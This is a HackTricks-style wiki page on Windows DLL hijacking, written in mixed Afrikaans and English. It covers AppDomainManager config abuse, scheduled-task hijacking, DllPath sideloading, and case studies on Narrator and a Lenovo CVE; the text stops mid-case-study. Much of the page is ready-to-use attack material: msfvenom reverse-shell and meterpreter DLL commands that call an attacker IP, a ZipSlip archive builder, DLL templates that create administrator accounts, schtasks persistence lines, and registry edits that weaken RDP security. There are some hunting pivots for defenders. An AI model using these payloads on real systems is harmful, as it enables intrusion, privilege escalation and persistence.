# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking behels die manipulasie van 'n vertroude toepassing om 'n kwaadwillige DLL te laai. Hierdie term dek verskeie taktieke soos **DLL Spoofing, Injection, en Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, die verkryging van persistence, en, minder algemeen, privilege escalation. Ten spyte van die fokus hier op escalation, bly die hijacking-metode konsekwent oor doelwitte heen.

### Common Techniques

Verskeie metodes word gebruik vir DLL hijacking, elk met sy doeltreffendheid afhangend van die toepassing se DLL-laaistrategie:

1. **DLL Replacement**: Vervang 'n egte DLL met 'n kwaadwillige een, opsioneel met DLL Proxying om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Plaas die kwaadwillige DLL in 'n soekpad voor die wettige een, en benut die toepassing se soekpatroon.
3. **Phantom DLL Hijacking**: Skep 'n kwaadwillige DLL vir 'n toepassing om te laai, terwyl dit dink dis 'n nie-bestaande vereiste DLL.
4. **DLL Redirection**: Wysig soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` files om die toepassing na die kwaadwillige DLL te rig.
5. **WinSxS DLL Replacement**: Vervang die wettige DLL met 'n kwaadwillige eweknie in die WinSxS directory, 'n metode wat dikwels met DLL side-loading geassosieer word.
6. **Relative Path DLL Hijacking**: Plaas die kwaadwillige DLL in 'n user-controlled directory saam met die gekopieerde toepassing, soortgelyk aan Binary Proxy Execution techniques.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading is nie die enigste manier om 'n vertroude **.NET Framework** proses te maak om attacker code te laai nie. As die teikenaansluitbare program 'n **managed** toepassing is, raadpleeg die CLR ook 'n **application configuration file** wat vernoem is na die uitvoerbare lêer (byvoorbeeld `Setup.exe.config`). Daardie lêer kan 'n pasgemaakte **AppDomainManager** definieer. As die config wys na 'n attacker-controlled assembly wat langs die EXE geplaas is, laai die CLR dit **before the application's normal code path** en voer dit uit binne die vertroude proses.

Volgens Microsoft's .NET Framework configuration schema, moet beide `<appDomainManagerAssembly>` en `<appDomainManagerType>` teenwoordig wees vir die custom manager om gebruik te word.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimale bestuurder:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktiese notas:
- Dit is **.NET Framework-specifieke** tradecraft. Dit hang af van CLR config parsing, nie van die Win32 DLL search order nie.
- Die host moet regtig ’n **managed EXE** wees. Vinnige triage: `sigcheck -m target.exe`, `corflags target.exe`, of kyk vir die **CLR Runtime Header** in PE metadata.
- Die config-lêernaam moet ooreenstem met die uitvoerbare naam presies (`<binary>.config`) en woon gewoonlik **langs die EXE**.
- Dit is nuttig met **signed Microsoft/vendor binaries** omdat die vertroude EXE onveranderd bly terwyl die kwaadwillige managed assembly in-process uitvoer.
- As jy reeds ’n skryfbare installer/update directory het, kan AppDomainManager hijacking as die **eerste stage** gebruik word, gevolg deur klassieke DLL sideloading of reflective loading vir latere stages.

### AppDomainManager as ’n downloader + scheduled-task bootstrap

’n Praktiese intrusiepatroon is om die vertroude managed EXE te koppel met beide ’n kwaadwillige `*.config` en ’n kwaadwillige AppDomainManager DLL wat slegs as ’n **klein bootstrapper** optree:

1. Gebruiker begin ’n signed .NET installer of updater vanaf ’n geloofwaardige ligging soos `%USERPROFILE%\Downloads`.
2. Die aangrensende config veroorsaak dat die CLR die aanvaller-assembly laai **voordat** die wettige app logic begin.
3. Die kwaadwillige manager voer ’n **path gate** uit (byvoorbeeld, gaan net voort as die host EXE vanaf `Downloads` loop, en laat slegs die second stage toe om vanaf `%LOCALAPPDATA%` te loop).
4. As die check slaag, laai dit die regte payload af na ’n user-writable path soos `%LOCALAPPDATA%\PerfWatson2.exe` en installeer persistence met ’n scheduled task.

Waarom hierdie variant saak maak:
- Die signed host EXE bly onveranderd, so triage wat net die main binary hash kan die kompromie mis.
- Eenvoudige **path-based anti-analysis** is algemeen: om die ZIP/EXE/DLL triad na Desktop, Temp, of ’n sandbox path te skuif kan die chain doelbewus breek.
- Die first-stage AppDomainManager DLL kan klein en low-noise bly terwyl die regte implant later afgelaai word.

Minimal persistence example wat dikwels met hierdie patroon gesien word:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notas:
- ` /rl highest` beteken **hoogste beskikbaar** vir daardie user/session; dit is nie op sigself 'n gewaarborgde SYSTEM escalation nie.
- Hierdie technique word dikwels beter gekategoriseer as **execution/persistence via .NET config abuse** as klassieke missing-DLL search-order hijacking, al ketting operators gereeld albei saam.

Detection pivots:
- Signed .NET executables wat vanaf **ZIP extraction paths**, `Downloads`, `%TEMP%`, of ander user-writable folders geloods word met 'n **colocated** `<exe>.config`.
- Nuwe scheduled tasks wie se action na `%LOCALAPPDATA%`, `%APPDATA%`, of `Downloads` wys en wie se name browser/vendor updaters naboots.
- Kortstondige managed bootstrap processes wat onmiddellik 'n ander EXE download, en dan `schtasks.exe` spawn.
- Samples wat vroeg exit tensy die executable path met 'n verwagte user-profile directory ooreenstem.

### Hijacking an existing scheduled task to relaunch the sideload chain

Vir persistence, kyk nie net vir **creating a new task** nie. Sommige intrusion sets wag totdat 'n legit installer 'n **normal updater task** skep en **rewrite dan die task action** sodat die bestaande name, author, en trigger vir defenders bekend bly.

Reusable workflow:
1. Installeer/voer die legit software uit en identifiseer die task wat dit normaalweg skep.
2. Export die task XML en noteer die huidige `<Exec><Command>` / `<Arguments>` values.
3. Replace net die action sodat die task jou **trusted host EXE** vanaf 'n user-writable staging directory begin, wat dan side-loads of AppDomain-loads die regte payload.
4. Re-register dieselfde task name in plaas daarvan om 'n nuwe ooglopende persistence artifact te skep.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Waarom dit stealtier is:
- Die task name kan steeds legit lyk (byvoorbeeld ’n vendor updater).
- Die **Task Scheduler service** begin dit, so parent/ancestor validation sien dikwels die verwagte scheduling chain eerder as `explorer.exe`.
- DFIR teams wat net na **new task names** soek, kan ’n task mis waarvan die registration reeds bestaan het maar waarvan die action nou na `%LOCALAPPDATA%`, `%APPDATA%`, of ’n ander attacker-controlled path wys.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergelyk `C:\Windows\System32\Tasks\*` XML en `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata teen ’n baseline.
- Alert wanneer ’n **vendor-looking updater task** vanaf **user-writable directories** execute of ’n .NET EXE met ’n colocalized `*.config` file begin.

> [!TIP]
> Vir ’n step-by-step chain wat HTML staging, AES-CTR configs, en .NET implants bo-op DLL sideloading laag, review die workflow hieronder.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Die mees algemene manier om missing Dlls binne ’n system te vind is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te run, **deur** die **volgende 2 filters** te **set**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

en wys net die **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

As jy na **missing dlls in general** soek, **laat** jy dit vir ’n paar **seconds** run.\
As jy na ’n **missing dll inside an specific executable** soek, moet jy ’n **ander filter soos "Process Name" "contains" `<exec name>` set, dit execute, en die capturing van events stop**.

## Exploiting Missing Dlls

Om privileges te escalate, is die beste kans wat ons het om ’n **dll te write wat ’n privilege process sal probeer load** in een van die **place waar dit gesoek gaan word**. Daarom sal ons in staat wees om ’n **dll** te **write** in ’n **folder** waar die **dll** voor die folder waar die **original dll** is gesoek word (weird case), of ons sal in staat wees om in ’n folder te **write waar die dll gesoek gaan word** en die original **dll** bestaan nie in enige folder nie.

### Dll Search Order

**Binne die** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy vind hoe die Dlls spesifiek loaded word.**

**Windows applications** soek na DLLs deur ’n stel **pre-defined search paths** te volg, in ’n spesifieke sequence. Die issue van DLL hijacking ontstaan wanneer ’n harmful DLL strategies in een van hierdie directories geplaas word, wat verseker dat dit voor die authentic DLL loaded word. ’n Solution om dit te prevent is om seker te maak die application gebruik absolute paths wanneer dit na die DLLs verwys wat dit require.

Jy kan die **DLL search order op 32-bit** systems hieronder sien:

1. Die directory van waar die application loaded is.
2. Die system directory. Gebruik die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function om die path van hierdie directory te kry.(_C:\Windows\System32_)
3. Die 16-bit system directory. Daar is geen function wat die path van hierdie directory kry nie, maar dit word gesoek. (_C:\Windows\System_)
4. Die Windows directory. Gebruik die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function om die path van hierdie directory te kry.
1. (_C:\Windows_)
5. Die current directory.
6. Die directories wat in die PATH environment variable gelys is. Let op dat dit nie die per-application path insluit wat deur die **App Paths** registry key gespesifiseer word nie. Die **App Paths** key word nie gebruik wanneer die DLL search path bereken word nie.

Dit is die **default** search order met **SafeDllSearchMode** geenabled. Wanneer dit disabled is, skuif die current directory op na tweede plek. Om hierdie feature te disable, create die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value en set dit na 0 (default is enabled).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function met **LOAD_WITH_ALTERED_SEARCH_PATH** geroep word, begin die search in die directory van die executable module wat **LoadLibraryEx** laai.

Laastens, let op dat **’n dll met die absolute path eerder as net die name loaded kan word**. In daardie geval gaan daardie dll **net in daardie path gesoek word** (as die dll enige dependencies het, gaan hulle as net loaded by name gesoek word).

Daar is ander maniere om die search order te alter, maar ek gaan dit nie hier verduidelik nie.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Gebruik **ProcMon** filters (`Process Name` = target EXE, `Path` eindig met `.dll`, `Result` = `NAME NOT FOUND`) om DLL names te collect wat die process probe, maar nie kan vind nie.
2. As die binary op ’n **schedule/service** run, sal die dropping van ’n DLL met een van daardie names in die **application directory** (search-order entry #1) by die volgende execution loaded word. In een .NET scanner case het die process na `hostfxr.dll` in `C:\samples\app\` gesoek voordat dit die regte copy uit `C:\Program Files\dotnet\fxr\...` gelaai het.
3. Build ’n payload DLL (byvoorbeeld reverse shell) met enige export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. As jou primitive ’n **ZipSlip-style arbitrary write** is, craft ’n ZIP waarvan die entry uit die extraction dir escapy sodat die DLL in die app folder land:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Lewer die argief af by die gemonitorde inbox/share; wanneer die geskeduleerde taak die proses weer begin, laai dit die kwaadwillige DLL en voer jou kode uit as die service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

’n Gevorderde manier om die DLL-soekpad van ’n nuutgeskepte proses deterministies te beïnvloed, is om die DllPath-veld in RTL_USER_PROCESS_PARAMETERS te stel wanneer die proses met ntdll se native APIs geskep word. Deur ’n aanvaller-beheerde gids hier te verskaf, kan ’n teikensproses wat ’n imported DLL by naam oplos (geen absolute pad en nie die safe loading flags gebruik nie) gedwing word om ’n kwaadwillige DLL uit daardie gids te laai.

Key idea
- Bou die prosesparameters met RtlCreateProcessParametersEx en verskaf ’n pasgemaakte DllPath wat na jou beheerde vouer wys (bv. die gids waar jou dropper/unpacker woon).
- Skep die proses met RtlCreateUserProcess. Wanneer die teiken-binary ’n DLL by naam oplos, sal die loader hierdie verskafte DllPath tydens resolusie raadpleeg, wat betroubare sideloading moontlik maak selfs wanneer die kwaadwillige DLL nie saam met die teiken EXE langs mekaar lê nie.

Notes/limitations
- Dit raak die child process wat geskep word; dit verskil van SetDllDirectory, wat slegs die current process beïnvloed.
- Die teiken moet ’n DLL by naam import of LoadLibrary (geen absolute pad en nie LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories gebruik nie).
- KnownDLLs en hardcoded absolute paths kan nie hijacked word nie. Forwarded exports en SxS kan prioriteit verander.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasionele gebruiksvoorbeeld
- Plaas 'n kwaadwillige xmllite.dll (wat die vereiste functions uitvoer of na die regte een proxy) in jou DllPath directory.
- Start 'n signed binary wat bekend is daarvoor dat dit xmllite.dll volgens naam opsoek met behulp van die bogenoemde technique. Die loader los die import op via die verskafte DllPath en sideload jou DLL.

Hierdie technique is in-the-wild waargeneem om multi-stage sideloading chains te dryf: 'n aanvanklike launcher laat val 'n helper DLL, wat dan 'n Microsoft-signed, hijackable binary met 'n custom DllPath laat spawn om te forseer dat die attacker se DLL vanaf 'n staging directory gelaai word.


### .NET AppDomainManager hijacking via `.exe.config`

Vir **.NET Framework** targets kan sideloading **voor `Main()`** gedoen word sonder memory patching deur die toepassing se aangrensende **`.exe.config`** file te abuse. In plaas daarvan om net op die Win32 DLL search order staat te maak, plaas die attacker 'n legitieme .NET EXE langs 'n kwaadwillige config en een of meer assemblies wat deur die attacker beheer word.

Hoe die chain werk:
1. Die host EXE start en die **CLR lees `<exe>.config`**.
2. Die config stel **`<appDomainManagerAssembly>`** en **`<appDomainManagerType>`** sodat die runtime 'n attacker-controlled `AppDomainManager` instansieer.
3. Die kwaadwillige manager kry **pre-`Main()` execution** binne die trusted host process.
4. Dieselfde config kan die CLR forseer om local assemblies eerste op te los (byvoorbeeld `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) en kan runtime validation/telemetry verswak sonder inline patching.

Campaign-style pattern (presiese nesting kan verskil volgens directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Why this is useful:
- **`<probing privatePath="."/>`** hou assembly resolution in die application directory, wat die folder in 'n voorspelbare sideloading surface verander.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** skuif execution in attacker code tydens CLR initialization, voor die legitimate app logic loop.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** kan 'n full-trust app toelaat om unsigned of tampered assemblies te load sonder 'n strong-name validation failure.
- **`<publisherPolicy apply="no"/>`** vermy publisher-policy redirects na newer assemblies.
- **`<requiredRuntime ... safemode="true"/>`** maak runtime selection meer deterministic.
- **`<etwEnable enabled="false"/>`** is veral interessant omdat die **CLR sy eie ETW visibility disable** vanaf configuration in plaas daarvan dat die implant `EtwEventWrite` in memory patch.

Operational pattern seen in recent campaigns:
- Stage 1 drops `setup.exe`, `setup.exe.config`, and local assemblies.
- Stage 2 copies them into a believable **AppData update** folder, renames the host to something like `update.exe`, and relaunches it via a **scheduled task**.
- Stage 3 verifies execution context (for example expected parent `svchost.exe` from Task Scheduler) before loading the final RAT DLL/export.

Hunting ideas:
- Signed or otherwise legitimate **.NET executables** running with suspicious adjacent **`.config`** files in user-writable locations.
- `.config` files containing **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, or **`etwEnable enabled="false"`**.
- Scheduled tasks that relaunch renamed update binaries from **`%LOCALAPPDATA%`** or app-specific `\bin\update\` directories.
- Parent/child chains where a scheduled task launches a trusted .NET host that immediately loads non-vendor assemblies from its own directory.

#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer permissies van alle vouers binne PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die imports van 'n executable en die exports van 'n dll nagaan met:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir 'n volledige gids oor hoe om **Dll Hijacking te abuse om privileges te escalate** met permissions om in 'n **System Path folder** te write, kyk:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sal check of jy write permissions op enige folder binne system PATH het.\
Ander interessante automated tools om hierdie vulnerability te ontdek is **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Example

In geval jy 'n exploitable scenario vind, een van die belangrikste dinge om dit suksesvol te exploit sou wees om 'n **dll te create wat minstens al die functions export wat die executable daarvan sal import**. Hoe dit ook al sy, let op dat Dll Hijacking handig is om [van Medium Integrity level na High te escalate (**UAC bypassing**)](../../authentication-credentials-uac-and-efs/index.html#uac) of van[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **hoe om 'n valid dll te create** in hierdie dll hijacking study wat gefokus is op dll hijacking vir execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Verder, in die **next section** kan jy **basiese dll codes** vind wat dalk nuttig kan wees as **templates** of om 'n **dll met non required functions exported** te create.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basies is 'n **Dll proxy** 'n Dll wat in staat is om **jou malicious code uit te execute wanneer dit geload word**, maar ook om **te expose** en te **work** soos **expected** deur **al die calls na die real library te relay**.

Met die tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik **'n executable aandui en die library selekteer** wat jy wil proxify en **'n proxified dll generate** of **die Dll aandui** en **'n proxified dll generate**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86 ek het nie 'n x64-weergawe gesien nie):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Let daarop dat in verskeie gevalle moet die Dll wat jy saamstel **verskeie functions export** wat deur die slagofferproses gelaai gaan word; as hierdie functions nie bestaan nie, sal die **binary hulle nie kan load nie** en die **exploit sal fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-voorbeeld met gebruiker skep</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatiewe C DLL met thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Gevallestudie: Narrator OneCore TTS Localisation DLL Hijack (Accessibility/ATs)

Windows Narrator.exe ondersoek steeds by opstart 'n voorspelbare, taalspesifieke localisation DLL wat gekaap kan word vir arbitrêre kode-uitvoering en persistentie.

Kernfeite
- Probe path (huidige builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (ouer builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- As 'n skryfbare, aanvaller-beheerde DLL by die OneCore path bestaan, word dit gelaai en `DllMain(DLL_PROCESS_ATTACH)` word uitgevoer. Geen exports word vereis nie.

Ontdekking met Procmon
- Filter: `Process Name is Narrator.exe` en `Operation is Load Image` of `CreateFile`.
- Begin Narrator en neem die poging waar om die bogenoemde path te laai.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC stilte
- ’n Naïewe hijack sal UI praat/uitlig. Om stil te bly, enumereer by attach Narrator-threads, open die hoof-thread (`OpenThread(THREAD_SUSPEND_RESUME)`) en `SuspendThread` dit; gaan voort in jou eie thread. Sien PoC vir volle kode.

Trigger en persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met bogenoemde, laai die start van Narrator die geplante DLL. Op die secure desktop (logon screen), druk CTRL+WIN+ENTER om Narrator te begin; jou DLL voer as SYSTEM op die secure desktop uit.

RDP-triggered SYSTEM execution (lateral movement)
- Laat klassieke RDP security layer toe: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na die host, druk op die logon screen CTRL+WIN+ENTER om Narrator te begin; jou DLL voer as SYSTEM op die secure desktop uit.
- Execution stop wanneer die RDP session sluit—inject/migrate gou.

Bring Your Own Accessibility (BYOA)
- Jy kan ’n ingeboude Accessibility Tool (AT) registry entry kloon (bv. CursorIndicator), dit wysig om na ’n arbitrêre binary/DLL te wys, dit importeer, en dan `configuration` na daardie AT-naam stel. Dit proxy arbitrêre execution onder die Accessibility framework.

Notes
- Om onder `%windir%\System32` te skryf en HKLM values te verander vereis admin rights.
- Alle payload logic kan in `DLL_PROCESS_ATTACH` leef; geen exports is nodig nie.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Hierdie case demonstreer **Phantom DLL Hijacking** in Lenovo se TrackPoint Quick Menu (`TPQMAssistant.exe`), opgespoor as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` geleë by `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` loop daagliks om 9:30 AM onder die context van die aangemelde user.
- **Directory Permissions**: Skryfbaar deur `CREATOR OWNER`, wat local users toelaat om arbitrêre files te laat val.
